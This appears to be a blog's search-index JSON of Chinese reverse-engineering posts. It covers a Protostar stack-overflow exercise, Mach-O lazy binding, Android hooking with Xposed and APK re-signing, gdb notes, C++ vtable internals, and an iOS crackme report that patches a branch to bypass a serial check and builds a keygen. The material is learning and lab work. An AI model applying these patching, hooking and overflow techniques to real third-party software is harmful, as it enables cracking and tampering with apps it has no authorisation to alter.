hook-stop在断点触发时观察栈变量和寄存器的值 &gt;info registers &gt;x/24wx $esp &gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/macho-dyld-link/macho-dyld-link/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 void main(int argc, char *argv[]) { printf(&quot;first printf&quot;); printf(&quot;second printf&quot;); } 对应的汇编代码 -&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; &quot;first printf&quot; 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; &quot;second printf&quot; 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/stub/"}]},{"title":"android re basic","date":"2017-04-09T09:25:13.000Z","path":"2017/04/09/android-re-basic/android-re-basic/","text":"Android系统简介文件目录 目录 说明 /system/app 预装的app(.apk)文件，如Alarm Clock, Browser, Contacts, Maps /system/framework Android系统的核心库，有core.jar, framework-res.apk, com.google.android.gtalkservice.jar /data/app 用户安装的app(.apk)文件 /data/data/app-package-name Context.openFileOutput()创建的文件 adb使用介绍 命令 说明 adb devices 列举连接到电脑 adb push local remote 可以copy本机文件到手机 adb pull remote local 可以copy手机文件到本机 adb shell 获得shell adb install apk-file 安装 adb -s device-serialnum 指定某台设备 adb shell getprop ro.build.version.release 获取系统版本 adb shell getprop ro.build.version.sdk 获取系统api版本 adb -d 唯一指定连接的设备 adb -d shell getprop ro.product.cpu.abi 查看cpu型号 apk文件结构 文件或目录 说明 AndroidManifest.xml 一个清单文件，它描述了应用的名字、版本、权限、注册的服务等信息 assets文件夹 存放资源文件的目录 classes.dex java源码编译经过编译后生成的dalvik字节码文件，主要在Dalvik虚拟机上运行的主要代码部分 lib文件夹 存放ndk编译出来的so文件 META-INF文件夹 1.该目录下存放的是签名信息，用来保证apk包的完整性和系统的安全性 2.CERT.RS 保存着该应用程序的证书和授权信息 3.CERT.SF 保存着SHA-1信息资源列表 4.MANIFEST.MF 清单信息 res文件夹 存放资源文件的目录 resources.arsc 编译后的二进制资源文件 xposed安装手机端需要安装xposed框架 电脑端需要去https://jcenter.bintray.com/de/robv/android/xposed/api/下载依赖的jar包手动依赖，或者 compileOnly &#39;de.robv.android.xposed:api:82&#39;让gradle去自动下载依赖。这两种方式不能同时使用。不然会编译出来的apk不能被xposed框架加载。 将两个jar包放入libs目录下 在build.gradle文件中添加以下 dependencies { compileOnly &#39;de.robv.android.xposed:api:82&#39; implementation fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) implementation &#39;com.android.support:appcompat-v7:28.0.0&#39; implementation &#39;com.android.support.constraint:constraint-layout:1.1.3&#39; testImplementation &#39;junit:junit:4.12&#39; androidTestImplementation &#39;com.android.support.test:runner:1.0.2&#39; androidTestImplementation &#39;com.android.support.test.espresso:espresso-core:3.0.2&#39; } 禁用instant run AndroidManifest.xml中写入以下标识为xposed模块 &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot; /&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;desciption for the xposed module&quot; /&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;53&quot; /&gt; 创建assets文件夹并创建xposed_init的txt文件，里面按行写入hook类的全路径 com.xia0.crackmehooker.Hooks 使用public class Hooks implements IXposedHookLoadPackage { final String packageName = &quot;com.xia0.crackmehooker&quot;; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { if (loadPackageParam.packageName.equals(packageName)) { XposedBridge.log(&quot;[xia0] ===================hook=============&quot;); Class clazz = loadPackageParam.classLoader.loadClass(&quot;com.xia0.crackmehooker.MainActivity&quot;); XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { param.setResult(&quot;you has been hooked&quot;); } }); } } } 代码很简单，无解释。 hook多dex或动态load的dexXposedHelpers.findAndHookMethod(ClassLoader.class, &quot;loadClass&quot;, String.class, new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { if (param.hasThrowable()) return; Class&lt;?&gt; cls = (Class&lt;?&gt;) param.getResult(); String name = cls.getName(); if (name.contains(&quot;StringScriptSource&quot;)) { XposedBridge.log(&quot;[xia0]: load class &quot;+ name); XposedBridge.hookAllMethods(cls, &quot;getScript&quot;,new XC_MethodHook() { @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { // TODO super.afterHookedMethod(param); String ret = (String) param.getResult(); XposedBridge.log(&quot;[xia0]: hook result :\\n&quot;+ (String) ret); } } ); } } }); 原理就是hook classLoader的loadClass方法，然后再去hook目标class，这时候就能解决hook的时候class不存在的问题。 jni编程java文件 package com.xia0.jni; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; import android.widget.Toast; public class MainActivity extends AppCompatActivity { public TextView textview; public Button button; static { System.loadLibrary(&quot;ndktest&quot;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); this.button = (Button) findViewById(R.id.button); this.textview = (TextView) findViewById(R.id.text); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { Toast.makeText(MainActivity.this, stringFromJni(), Toast.LENGTH_SHORT).show(); textview.setText(stringFromJni()); } }); } public native String stringFromJni(); } C++文件 native.h #ifndef NDK_CORE_H #define NDK_CORE_H #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) #include &lt;jni.h&gt; #include &lt;stdlib.h&gt; __BEGIN_DECLS JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved); JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved); __END_DECLS #endif //TEXT_HELLO_H native.cpp #include &quot;native.h&quot; jstring returnString(JNIEnv *env,jobject jobj){ char* str = &quot;I come from C＋＋&quot;; return env-&gt;NewStringUTF(str); } static JNINativeMethod gMethods[] = { {&quot;stringFromJni&quot;,&quot;()Ljava/lang/String;&quot;,(void *)returnString } }; JNIEXPORT int JNICALL JNI_OnLoad(JavaVM *vm,void *reserved) { JNIEnv *env; if (vm-&gt;GetEnv((void **) &amp;env,JNI_VERSION_1_6) != JNI_OK){ return JNI_ERR; } jclass javaClass = env-&gt;FindClass(&quot;com/xia0/jni/MainActivity&quot;); if (javaClass == NULL){ return JNI_ERR; } if (env-&gt;RegisterNatives(javaClass,gMethods,NELEM(gMethods)) &lt; 0) { return JNI_ERR; } return JNI_VERSION_1_6; } Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) LOCAL_MODULE := ndktest LOCAL_C_INCLUDES += $(LOCAL_PATH) LOCAL_SRC_FILES := native.cpp include $(BUILD_SHARED_LIBRARY) Application.mk APP_ABI := armeabi-v7a x86 APP_PLATFORM := android-16 APP_STL := c++_shared APP_OPTIM := debug 打开terminal，cd src/main/jni文件夹中，然后执行ndk-build 在项目名称的右键点击Link C++ Project with Gradle ，选择ndk-build，指定Android.mk文件路径 java 符号 c++ boolean Z jboolean byte B jbyte char C jchar short S jshort int I jint long J jlong float F jfloat double D jdouble void V objects对象 Lfully-qualified-class-name; jobject Arrays数组 [array-type jintArray 重打包签名生成keystore keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 签名apk jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name 验证签名 jarsigner -verify -verbose -certs my_application.apk zip zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk 调试 jdb 在AndroidManifest.xml的application中添加android:debuggable=&quot;true&quot; mprop BDOpener 参考 adb shell am start -D -n com.test.id/.MainActivity adb -d forward tcp:29882 jdwp:app_pid jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=29882 ida adb push dbgsrv/android_server /data/local/tmp ./android_server adb forward tcp:23946 tcp:23946 lldb platform select remote-android adb push lldb-server /data/local/tmp/ adb shell /data/local/tmp/lldb-server platform --server --listen unix-abstract:///data/local/tmp/debug.sock platform select remote-android platform connect unix-abstract-connect:///data/local/tmp/debug.sock 刷机/root/xposedUnlock bootloaderhttps://developers.google.com/android/images下载google原生镜像 adb reboot bootloader fastboot flashing unlock fastboot reboot fastboot boot twrp-3.2.3-0-blueline.img // boot TWRP 注意点： 在安装TWRP应用的时候不要安装为系统应用 参考https://www.thecustomdroid.com/root-google-pixel-3-xl-guide/ xposed框架https://github.com/ElderDrivers/EdXposed 常见资源/索引 平台代号、版本、API 级别和 NDK 版本 https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例： (gdb) break func Breakpoint 1 at 0x3475678: file test.c, line 12. (gdb) command 1 Type commands for when breakpoint 1 is hit, one per line. End with a line saying just &quot;end&quot;. &gt;print arg1 &gt;print arg2 &gt;print arg3 &gt;end (gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表 |63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............| |RAX...................|","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"gdb","slug":"gdb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/gdb/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： class Base { public: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } virtual void g() { cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; } virtual void h() { cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; } }; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： typedef void(*Fun)(void); Base b; Fun pFun = NULL; cout &lt;&lt; &quot;虚函数表地址：&quot; &lt;&lt; (int*)(&amp;b) &lt;&lt; endl; cout &lt;&lt; &quot;虚函数表 — 第一个函数地址：&quot; &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl; // Invoke the first virtual function pFun = (Fun)*((int*)*(int*)(&amp;b)); pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： (Fun)*((int*)*(int*)(&amp;b)+0); // Base::f() (Fun)*((int*)*(int*)(&amp;b)+1); // Base::g() (Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， Base *b = new Derive(); b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： Derive d; Base1 *b1 = &amp;d; Base2 *b2 = &amp;d; Base3 *b3 = &amp;d; b1-&gt;f(); //Derive::f() b2-&gt;f(); //Derive::f() b3-&gt;f(); //Derive::f() b1-&gt;g(); //Base1::g() b2-&gt;g(); //Base2::g() b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： Base1 *b1 = new Derive(); b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： class Base { private: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } }; class Derive : public Base{ }; typedef void(*Fun)(void); void main() { Derive d; Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0); pFun(); } 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vtable/"}]},{"title":"python各种用法总结","date":"2017-02-15T07:11:45.000Z","path":"2017/02/15/pythonNote/pythonNote/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"crackme","slug":"crackme","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"}]}]